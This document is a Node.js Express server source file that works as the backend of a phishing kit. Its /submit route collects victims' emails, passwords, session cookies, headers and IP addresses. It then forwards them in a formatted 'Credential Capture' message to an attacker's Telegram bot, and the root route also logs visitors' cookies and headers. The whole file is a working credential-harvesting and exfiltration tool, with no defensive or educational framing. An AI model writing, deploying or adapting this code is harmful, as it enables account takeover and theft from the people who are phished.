const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "YOUR_CHAT_ID_HERE";

// Helper function to send to Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram API error:', result.description);
        }
        return result.ok;
    } catch (error) {
        console.error('Failed to send to Telegram:', error);
        return false;
    }
}

// Route to serve the main page
app.get('/', (req, res) => {
    // Capture session cookies and other data
    const sessionData = {
        cookies: req.cookies,
        headers: req.headers,
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent'),
        timestamp: new Date().toISOString()
    };
    
    // Log session data
    console.log('Session Data:', JSON.stringify(sessionData, null, 2));
    
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route to handle credential submission
app.post('/submit', async (req, res) => {
    const { email, password } = req.body;
    
    // Capture all available data
    const capturedData = {
        email: email,
        password: password,
        cookies: req.cookies,
        sessionCookies: req.get('Cookie') || 'None',
        headers: req.headers,
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent'),
        referer: req.get('Referer') || 'Direct',
        timestamp: new Date().toISOString(),
        requestBody: req.body
    };
    
    // Format message for Telegram
    const message = `
🔐 <b>Credential Capture</b>
━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
🍪 <b>Cookies:</b> ${capturedData.sessionCookies}
🌐 <b>IP:</b> ${capturedData.ip}
📱 <b>User Agent:</b> ${capturedData.userAgent.substring(0, 100)}...
🔗 <b>Referer:</b> ${capturedData.referer}
🕐 <b>Time:</b> ${capturedData.timestamp}
━━━━━━━━━━━━━━━━━━━━`;
    
    // Send to Telegram
    const telegramSent = await sendToTelegram(message);
    
    // Log to console as backup
    console.log('Captured Data:', JSON.stringify(capturedData, null, 2));
    
    // Return success response
    res.json({ 
        success: true, 
        message: 'Data captured successfully',
        telegramSent: telegramSent
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        telegram: TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" ? 'Configured' : 'Not Configured'
    });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Access your application at: http://localhost:${PORT}`);
    console.log(`Telegram Bot Configured: ${TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" ? 'Yes' : 'No'}`);
});